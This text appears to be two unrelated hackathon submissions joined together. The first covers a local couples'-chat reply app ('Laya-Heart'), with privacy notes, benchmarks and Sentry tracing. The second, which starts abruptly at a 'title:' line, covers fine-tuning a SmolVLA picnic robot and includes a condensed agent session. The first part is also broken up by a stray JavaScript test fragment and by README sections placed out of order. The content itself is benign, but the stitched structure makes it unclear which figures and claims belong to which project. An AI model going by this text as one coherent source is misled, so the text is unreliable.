For friends to try the app, I wrote a 15-minute tester kit: six made-up chats, closing questions about price, and a record sheet. An AI agent went through it on my laptop with the real build (fine-tuned Laya, stock Gemma): a dry run, not a user study, with no people and no payments. The flow held up, from an edited reply landing on the clipboard to 我下周六生日哦 ("my birthday is next Saturday") being saved as October 24. It also caught slips: two replies seemed to lose track of who was busy or of the latest topic, and one promised 我下个月肯定能回来 ("I'll definitely be back next month") with nothing in the chat to back it. That kind of overpromise is what the fine-tuned Gemma made once in 297 practice chats, against 16 times for stock Gemma.

Why Does Open Innovation Matter?

  • Where open beat closed, here. Jev Chat Assistant, the app I built on, asks a closed, hosted judge by default and sends it the last ten lines of the chat. I can't tune that model, and its terms don't allow training a model on its answers. Laya's weights are open, so I fine-tuned it for couples' chats against my own bar: macro-F1 0.33 → 0.57, safety recall 0% → 62%. And it runs on the user's own PC, with 0 bytes sent.
  • Privacy you can check. A couple's chat is about as private as data gets, and the other person never agreed to send it anywhere. Open weights are what make this possible: both models run on your machine, the server listens only on 127.0.0.1, and a badge in the header counts the bytes each turn sends off the machine (zero by default). People are wary: 71% of US adults think AI will make their personal information less secure.
  • Costs that allow a one-time price. There is no per-message bill, and the whole fine-tuning run cost about US$3 plus free GPU hours, so the app can be a one-time purchase instead of a subscription.
  • A niche I can tune for. Reading the subtext in Chinese couples' chats (你最好是, "you'd better be"; 没事; 随便, "whatever") is a narrow task. I can train a small judge for it on my own data against my own gates, and when a result surprised me, I could open it up and see why: seed noise, the data mix, the exam teacher.
  • No lock-in. Point the settings at another GGUF file or Ollama model, or at a laya-serve endpoint, and the app uses it.

  await post(`/api/people/${id}/thread`, { thread: said });

  const types = ev.map((e) => e.type);
  assert.ok(types.indexOf("memory:saved") > types.indexOf("done"), "after the replies, never before them");
  const saved = ev.find((e) => e.type === "memory:saved").data.items;
  assert.equal(saved.length, 1);
  assert.equal(saved[0].label, "生日");

  assert.equal(undone.memory.auto.length, 0);
  assert.equal((await post(`/api/people/${id}/auto/NOT-AN-ID/delete`, {})).status, 404);

  assert.ok(!off.some((e) => e.type === "memory:saved"));
  await post("/api/settings", { autoMemory: true });

## Privacy

- It connects to no chat app: no screen reading, no accessibility hooks, no clipboard watching.
  It sees only what you paste into the page or type.
- The server listens on `127.0.0.1` only, refuses requests whose Host is not its own (no DNS
  rebinding) and POSTs from other origins, sends no CORS headers, and serves the page under a
  strict Content-Security-Policy.
- With the defaults (Laya in a local worker, Gemma in a local llama-server), every turn sends
  0 bytes off the machine; the header badge shows the count.
- llama-server would answer any web page open in your browser (it allows every origin), so the
  app starts it with a random key each time: other pages get 401 and can't use the model or
  read its state. Only the health check stays open.
- The only time it goes online is the first start, when you press *Download*: it fetches the
  files listed under [Run it](#run-it) from GitHub and Hugging Face (or hf-mirror.com), sending
  nothing but the requests for those files.
- Each person's chat, the book you write about them and what was kept from the chat by itself
  (`auto.json`) are saved on this PC, in `~/.laya-heart/people/` (see
  [Profiles and memory](docs/how-it-works.md#profiles-and-memory)); deleting a person moves them to
  `~/.laya-heart/trash/` for 30 days. What to keep is picked by the local Gemma only: with a
  remote or Ollama drafter nothing is picked, and a look's line in `metrics.jsonl` holds only
  counts and times. Laya's cards are cached in memory by chat
  text until *Clear the chat* (in the profile) or exit. Also on disk: `settings.json` and `metrics.jsonl` (numbers only:
  stage times, token counts, bytes out, how many memory chunks a turn used) in `~/.laya-heart`,
  plus llama-server's log.
- A remote judge or drafter, if you set one, gets none of the memory: not the book, not the
  core card, not the chunks.
- Optional comparison backends — an HTTP judge (`laya-serve` or Jev) and an
  OpenAI-compatible drafter — are off by default; when they point at a remote host the badge
  turns amber. Their keys are never stored: settings name an environment variable instead.
- Never sends a message for you.


The MTP draft model Ollama ships for speculative decoding made writing slower here (7–9 vs
11–14 tokens/s, 15–30% of drafted tokens accepted at temperature 0.8), and the Intel iGPU
(Vulkan) read twice as fast but wrote slower, took 26 s to load and 3 GB more memory, so both
are off.

## Measured

Development laptop: Intel i5-13420H (8 cores / 12 threads), 16 GB RAM, no discrete GPU,
Windows 11, plugged in. `npm run bench` plays made-up chats line by line through the HTTP API and
times every event from the moment the request is sent (2026-10-14, about 4 GB of RAM free). These
runs used zero-shot Laya, Ollama's llama-server and `gemma4:e2b`, before the switch to the official
build and to the fine-tuned models:

| Time from paste | Chat going on (turns 2–6) | New chat (5 chats) |
| --- | --- | --- |
| Laya's first answer | p50 0.32 s · p95 0.45 s | p50 0.22 s · p95 0.27 s |
| Whole card | p50 0.39 s · p95 0.96 s | p50 0.54 s · p95 0.70 s |
| First reply text on screen | p50 2.6 s · p95 3.4 s | p50 3.0 s · p95 3.2 s |
| First reply complete | p50 3.5 s · p95 5.1 s | p50 3.9 s · p95 4.7 s |
| Both replies, ranked | p50 5.0 s · p95 6.5 s | p50 4.9 s · p95 6.0 s |
| Tokens Gemma had to read (from cache) | 62–82 (257–348) | 81–105 (246–249) |

- Ready after `npm start`: 8–10 s in four runs (Laya 3–6 s and llama-server 5–6 s in parallel,
  then reading the fixed rules 2.6–3.7 s).
- The fine-tuned models against the previous default (2026-10-18, `node scripts/bench_latency.mjs --settings`,
  alternating, 2–3 runs each): Laya v3 with Gemma v4, and zero-shot Laya with Google's QAT file,
  both on the official llama-server. First reply p50 4.9 vs 5.5 s in a chat going on and 5.7 vs
  5.3 s in a new chat: no slower overall, and Gemma v4 held 0.14 GB less private memory. Both pairs
  measured slower that evening than the table (cards about 2 s, first replies about 5 s), so
  compare them with each other rather than with the table.
- These numbers move with whatever else the PC is doing. Runs while other programs kept the CPU busy gave
  cards of 1–3 s and first replies of 4–9 s; with 0.6 GB of RAM free (an office suite and a
  browser open) a turn took 8.1 s to the first reply and 14.7 s in all.
- Memory while running (end of a bench run): llama-server ≈ 1.6 GB, 0.83 GB of it private (the
  rest is the model file, mapped); Laya's worker ≈ 0.7 GB. Loading reads every Gemma weight once
  to lay it out again for the CPU and runs on that copy; the ~0.85 GB of file pages it read are
  never used again, so on Windows the app takes them out of llama-server's working set right
  after loading (it held 2.45 GB before; no slower in alternating runs). Turning the re-layout off
  (`--no-repack`) saved a little less and made every turn 13–17% slower. Gemma through Ollama
  took ≈ 5.7 GB private.
- Bytes sent off the machine: 0.

Earlier measurements of Laya itself (int8 and DirectML trials) are in
[models/README.md](../models/README.md). Accuracy: the first fine-tuning run's numbers, on practice
exams written and labelled by models, are in the [fine-tuning report](fine-tuning-report.md),
and `npm run reproduce` recomputes them from the raw data in [eval/](../eval/README.md); human gold
labels come later.

This is the part of a Claude Code session where the agent added Sentry tracing. It made tracing opt-in and numbers-only, so the app's promise still holds: with the defaults, nothing you paste leaves your PC. Then it didn't stop at its own unit tests. It pointed a made-up DSN at a receiver on localhost, ran a turn through the real Sentry SDK and read every byte that would have gone out. That check caught what the tests couldn't: Sentry 11 streams spans one at a time, so the hook it had written for whole transactions never ran. Nothing had leaked, but only because no text is ever put on a span. It moved the guard and proved it both ways: a span stuffed with chat text arrives with just its token count, and with the guard taken out, the same check fails and prints the leaked words. (The upload leaves out local paths, the agent's internal reasoning and screenshots.)

Prize Categories

Best Use of Gemma. Gemma 4 E2B writes the reply drafts, locally in llama.cpp (with --swa-full and a cache-friendly prompt), and picks which facts from the chat are worth keeping; the code checks that each appears in the chat word for word. The fine-tuned Gemma described above scored 61% against stock Gemma in 297 blind comparisons (ties counting half) and made things up or overpromised once instead of 16 times. Evidence: the model on Hugging Face, both models' drafts and teacher B's verdicts in eval/data/gemma, and npm run reproduce.

Best Use of Sentry Agent Tracing. Every turn is one trace in the shape Sentry's AI Agents views expect: invoke_agent laya-heart for the turn; a gen_ai.decide span for each Laya answer (gen_ai.rerank when it puts the replies in order); gen_ai.chat for Gemma, with tokens in, tokens read from llama-server's cache, tokens out and time to first token; and gen_ai.memory.client for what the turn kept. Tracing is opt-in and numbers-only: no prompt, reply or memory is ever put on a span, a send hook drops any attribute outside an allowlist, and scripts/trace_check.mjs runs a turn through the real SDK into a receiver on localhost and searches every byte for the chat's words. Sentry agrees: Gemma's span reads No input for this span.

What 40 traced turns with the fine-tuned models showed:

  • In the turn above, on a busy CPU, three Laya calls (two card questions and the hidden safety question) take 1.25 s before Gemma starts. Gemma's prompt is 465 tokens, 378 of them already in llama-server's cache, so it reads 87 new ones (2.0 s) and writes 43 (3.9 s).
  • The AI Agents dashboard counted 288 Laya calls and 40 Gemma calls, 51,602 tokens in all, and its estimated cost stayed at $0: both models run on the laptop.

Building it turned up two bugs in the tracing itself. The first, Sentry 11 streaming spans one at a time so the scrubbing hook never ran, is in the agent session above. The second: the first real run arrived as one 194-span trace, because with the default integrations off nothing started a trace per request. Starting each turn with Sentry.startNewTrace fixed it; the old trace is still at the bottom of the list.

Best Use of Render. Render hosts the copilot's front end: the online demo is the app's real page, with its server's API running in the browser tab and stand-in models, so anyone can try every flow before downloading anything. It is a static site deployed from a public repository with no build step. That split is the point: Render serves the part that is fine to share, and the models, with the chats they read, stay on the user's PC.

Best Use of ElevenLabs. The demo video is narrated with ElevenLabs text-to-speech (eleven_multilingual_v2, the voice Sarah). I wrote 13 short lines, one for each caption or title card, and the captions show the same words. A script trims each clip and places it while its caption is on screen, ffmpeg mixes the speech under the recording, and a pass through ElevenLabs speech-to-text confirmed that every line is heard while its caption is showing. ElevenLabs voices the demo, not the app: the app itself never sends what you paste anywhere.

Best Use of GitHub Copilot. Not Copilot itself: this entry is for the category's GitHub Actions part. A test workflow runs on every push to main and every pull request, on Ubuntu, Windows and macOS: the unit tests, including the check that recomputes the report's 62 evaluation numbers, then the page in headless Chrome with the stand-in models, keeping the screenshots. It caught a bug the local runs hadn't shown: on macOS, the browser test hung at its last step until the job's 20-minute limit. Reproducing it locally pointed to the server's close(), which waited on a connection the page's poll kept busy. It now ends connections first, and the browser step fails within 8 minutes instead of 20.

Laya-Heart drafts chat replies; it is not counseling or crisis support. In a crisis, contact local emergency services or a helpline (China 12356, US 988). The other person may not have agreed to their messages being analyzed, so use it with care.

title: For the Price of a Coffee, My Picnic Robot Learned How I Talk
description:
This is a submission for the Hacktoberfest Open-Source AI Challenge Week 2: Side Hustle

What I Built

In Week 1, an open robot model (SmolVLA) packed my picnic only when I used its exact training sentence. This week I fine-tuned it on a few demos, each labeled with the ways people actually ask, and priced the fix.

For the price of a coffee, the robot learned how I talk.

Before After 1 demo per item
Phrasings I taught 31% 80%
Phrasings it never saw 29% 78%
Demos needed 4 in total
GPU cost about $1.50

Who would pay: anyone whose robot meets people who did not write its training data.

Customer What they say What they get
Café with a kitchen arm "grab me the oat milk" A model that understands the staff
Care home "could you get my cup?" A robot that does not need exact commands
Robot vendor abroad Their customers' dialect A fine-tune per market, priced per job

Demo

Upper clip of each pair: the published model. Lower clip: after one demo per item, same scene.

Rows Request
Top two "pack the {item} for our picnic" (taught)
Bottom two "the basket still needs the {item}" (never seen in training)

The results

Six fine-tuned models (1 to 40 demos per item) plus the published one, all tested on the same 420 episodes.

Demos per item Taught Never seen Original sentence 6 untrained items
0 (published) 31% 29% 100% 87%
1 80% 78% 95% 60%
3 86% 74% 90% 70%
5 84% 74% 88% 70%
10 86% 77% 92% 72%
20 92% 79% 98% 68%
40 92% 78% 98% 68%

1. One demo per item does most of the work

Phrasing 0 demos 1 demo
A ● grab the {item} and put it in the basket 23/40 35/40
B ● {item} in the basket 3/40 29/40
C ● pack the {item} for our picnic 1/40 31/40
D ● could you put the {item} in the picnic basket? 23/40 33/40
E ○ toss the {item} into the basket 8/40 33/40
F ○ the basket still needs the {item} 7/40 25/40
G ○ can you get the {item} into the basket for me? 18/40 32/40
H ○ move the {item} over to the basket 13/40 34/40

E to H were frozen before training, under rules that ban the verbs and sentence shapes of A to D.

2. The twist: more demos did not help with new words

1 demo 40 demos
Taught phrasings 80% 92%
Never-seen phrasings 78% 78%
Orange juice, never-seen 36/40 23/40

Same scene, same request. Likely reason: every demo carried the same five sentences, so more demos taught more ways to move, not more ways to be asked. One training run per N and cream cheese went the other way, so this is a strong hint, not a proof (see also VLA or IL? by @fn8211).

Lesson for the side hustle: collect more phrasings, not more demos.

3. The fine print: it forgets what it was not taught

Original sentence 0 demos 1 to 40 demos
4 trained items 100% 88-98%
6 untrained items 87% 60-72%

The fine-tune only saw four items, so the model drifted toward them. Ketchup, the first item my robot ever packed in Week 1, still works in 6 to 8 of 10 scenes, but loses this one. Next fix to try: mix in a few demos of every item.

What It Costs

Time Money
One fine-tune (shared GPU, 3000 steps) 48 min $1.50
One fine-tune (GPU alone, 1000 steps, estimated) 10 min $0.30
Whole experiment (6 models, about 4,400 evaluation episodes) 6 h $11
Buying the GPU instead $10,000+

Validation stopped improving after step 1000 for 3+ demos per item (training chart below), so a real job can stop early.

How I Built It

Part Choice
Model lerobot/smolvla_libero, 450M parameters
Data Public lerobot/libero demos, first N per item, 4 items
The trick A wrapper around lerobot-train relabels each sample with one of 5 sentences at random; no new recordings
Training Whole model, 3000 steps, batch 32, lr 2.5e-5
Checkpoint choice Best of steps 1000/2000/3000 on held-out scenes, taught phrasings only
Test 420 episodes per model, LIBERO-Object in MuJoCo, same scenes and seeds for all
Hardware 1x A100 80 GB on RunPod, training and evaluation side by side in tmux

Gotcha: the pod showed 256 CPUs but had 16; evaluation threads starved training until I set OMP_NUM_THREADS=1 (setup guide).

Limits: one training run per N; simulation only; phrasing G turned out closer to D than my rules intended.

Code

johyeongseob / hacktoberfest-2026

Hacktoberfest 2026 projects and experiments focused on open-weight AI, VLA, and Physical AI.

Hacktoberfest 2026

A month-long exploration of open-weight AI, VLA, and Physical AI.

Goals

Projects

│   └── week-2/             # Teaching the Picnic Robot My Words (SmolVLA fine-tune on a rented GPU)

Development Environment

Component Configuration
Host Windows
CPU Intel Core Ultra X7 358H; 16 logical CPUs visible in WSL
GPU Intel Arc B390 GPU; Windows driver 32.0.101.8356
RAM
…
View on GitHub
Where What
dev-challenge/week-2 Relabeling wrapper, training and evaluation scripts, all tables, chart and video scripts
Hugging Face Hub All six fine-tuned models with a model card

Why Does Open Innovation Matter?

Open piece Why the business needs it
Open weights You cannot fine-tune what you cannot download
Open data I relabeled public demos instead of recording any
Open benchmark I could measure what one demo buys and what it breaks
Hourly GPUs + small model The customer pays for minutes, not a GPU or a per-call API
A model file The customer runs it offline on their own robot, free of anyone's pricing

No paying user yet. The first person I would show it to: anyone who has watched a robot arm ignore a perfectly reasonable request.

My Agent Session

I built this with Claude Code over a week. The session below is a curated slice: the experiment design, the GPU run and its one bug, the results, and the charts and videos.

Teaching a picnic robot new words: fine-tuning SmolVLA on a rented GPU (curated, translated)
You

[Note: condensed English translation of a Claude Code session held in Korean, October 12-18, 2026. Messages are selected and shortened; wording is translated, not verbatim.]

Week 2 is Side Hustle. Can we go beyond Week 1's inference and actually fine-tune SmolVLA? I want Weeks 2 to 4 to continue the picnic robot story, and I'd rather pick something that shows real VLA work than something safe.

Agent

Proposal: teach lerobot/smolvla_libero the four Week 1 phrasings that failed, with N demos per item, and measure success against N. The curve is a price list for a "fit the robot to how your users talk" service.

You

Isn't smolvla_libero already fine-tuned on LIBERO-Object? Wouldn't training and testing be the same thing?

Agent

It has seen every Object demo, but only with one sentence per task. What is new is the wording. Split: train on the first N demos per item relabeled with the original sentence and A to D; choose checkpoints on initial states 10 to 14; test on states 0 to 9; and add four unseen phrasings E to H that are only ever used in the test.

You

Write E to H.

Agent

Wrote E to H under fixed rules (none of the verbs pick, place, grab, put, pack; a sentence structure different from A to D; the basket stays the target) and froze them in data/wordings.json before any training.

You

Train on the four items with N = 1, 3, 5, 10, 20, 40. With the same number of steps, won't the small N runs overfit?

Agent

Every N gets the same 3000 steps (lr 2.5e-5, warmup 200, batch 32), and checkpoints are scored on the validation states while training runs, so overfitting would show up as a falling validation curve. The best checkpoint per N goes to the test.

You

Can one command run everything?

Agent

run_all.sh starts one tmux session: the N = 0 test, the training chain, one watcher per run, and a final waiter. A dry run with stub scripts caught two bugs before any GPU time: parallel jobs appending to one results file corrupted it (now one file per job, merged at the end), and results depended on job grouping (now the RNG is reseeded per episode).

▸ bash dry run of run_all.sh with stub training and evaluation scripts
Input
$ dry run of run_all.sh with stub training and evaluation scripts
Output
interleaved lines found in results.jsonl; after the fix, a clean rerun
You

DigitalOcean, the sponsor, won't let my new account create a GPU Droplet. What now?

Agent

A new account needs a $250 prepay or a support ticket that takes one to two business days. RunPod rents an A100 SXM 80 GB by the hour with prepaid credit, so I rewrote setup.md for a RunPod pod. On the pod, the smoke test (butter, original sentence) succeeded, and a 200-step training probe used 28 GB of GPU memory at 0.46 s per step.

You

Training is stuck at step 0.

Agent
▸ top CPU use on the pod
Input
CPU use on the pod
Output
evaluation processes at 400-600% CPU each

nproc reports the host's 256 CPUs, but the pod has 16 vCPU, so every evaluation process spawned hundreds of threads and starved training. Fix: OMP_NUM_THREADS=1 (and MKL, OpenBLAS) in the environment, then restart. To fit the time budget, validate at steps 1000, 2000, and 3000 only.

You

I'm going to close everything and turn off my laptop. Will it keep running?

Agent

Yes, the jobs live in tmux on the pod. Before leaving, check that training passed step 1000, the first checkpoint exists, no process is far above 100% CPU, and there is disk and credit left.

Agent

All six runs finished in about six hours and $11. Taught phrasings: 31% at N = 0, 80% at N = 1, 92% at N = 20 and 40. Unseen: 29% at N = 0, then 74-79% for every N. Six untrained items: 87% to 60-72%.

You

So unseen phrasings don't scale with N?

Agent

No. Per item it is mixed: cream cheese rises, orange juice falls from 36/40 to 23/40, and they cancel out. A likely reason: every demo carries the same five sentences, so more demos add ways to move, not ways to be asked. With one seed per N, it is a hypothesis.

You

The original sentence was in the training mix. Why do the other items still fail?

Agent

The original sentence was only there for the four trained items; the other six never appeared, so the whole model drifted toward the four. The checkpoint choice never looked at them, and even the step-1000 checkpoints forgot as much, so it happens early. Mixing in a few demos of every item is the fix to try next.

You

What is the most important result?

Agent

One demo per item does most of the work: that is the price, and the Side Hustle story. Then the twist (more demos do not help new phrasings) and the cost (forgetting).

You

Make video grids: the four items, a taught and an unseen phrasing, before and after one demo.

Agent
▸ make_grid.py items
Input
items
Output
4x4 grid: N = 0 fails in all 8 tiles, N = 1 succeeds in all 8

Scenes chosen by a rule: N = 0 fails and every fine-tuned model succeeds. Also a 1x4 orange juice grid (N = 1, 10, 20, 40) and a butter-versus-ketchup grid for forgetting.

You

In the line chart, use filled dots for what was taught and hollow dots for what wasn't, so it reads like the heatmap.

Agent

Filled now means "in the fine-tuning data" (the original sentence and A to D); hollow means not (E to H, and the six other items). Both charts use the same rule and legend.

You

Publish the models.

Agent

Wrote a short model card with the charts and the results table, uploaded it, and made the Hugging Face repo public with all six checkpoints.

You

Let's write the DEV post. Use DevRelay actively, and lean on figures, tables, and videos rather than text.

Agent

Pulled the Week 2 rules and judging criteria with get_challenge_details, checked another submission for the template, searched DEV for related posts (one on whether fine-tuning turns a VLA into an imitation learner), and staged the post as an unpublished draft. Rewrote it around tables, charts, and videos. This session is saved with submit_agent_session and embedded in the post.

31 of 31 messages

Note: I worked with the agent in Korean. This is a condensed English translation of the key moments, not a verbatim transcript.

Disclosure: I designed the experiment, ran the training and every test episode, and reviewed every result. An AI coding agent helped write the scripts, drafted phrasings E to H under rules I set (I reviewed and froze them before training), analyzed the results, made the charts and videos, and drafted this post.
